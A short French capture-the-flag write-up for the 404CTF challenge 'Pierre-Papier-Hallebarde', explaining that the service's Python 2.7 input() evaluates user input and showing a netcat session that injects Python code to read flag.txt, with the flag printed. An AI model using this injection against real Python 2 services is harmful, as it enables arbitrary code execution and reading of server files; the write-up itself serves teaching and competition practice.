## Pierre-Papier-Hallebarde

### Description

L'objectif est de gagner à pierre-feuille-ciseaux contre un programme qui adapte ses coups en fonctions de ceux de son adversaire.
Autant dire qu'il va falloir ruser.

### Exploit

Le code source définit le choix de l'utilisateur comme ceci :
```python
choix_utilisateur = int(input("Choix ?\n> "))
```
Et l'en-tête du code nous indique qu'on utilise python2.7. A partir de là, [c'est gagné !](https://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html)

```bash
$ nc challenge.404ctf.fr 30806
Bienvenue sur pierre-papier-Hallebarde !
La pierre bat la Hallebarde, le papier bat la pierre et la Hallebarde bat le papier
Pour jouer entrez un chiffre entre 1 et 3 :
1 : pierre
2 : papier
3 : Hallebarde
Choix ?
> __import__('sys').stdout.write(open("flag.txt").readline())
404CTF{cH0iX_nUm3r0_4_v1c701r3}
```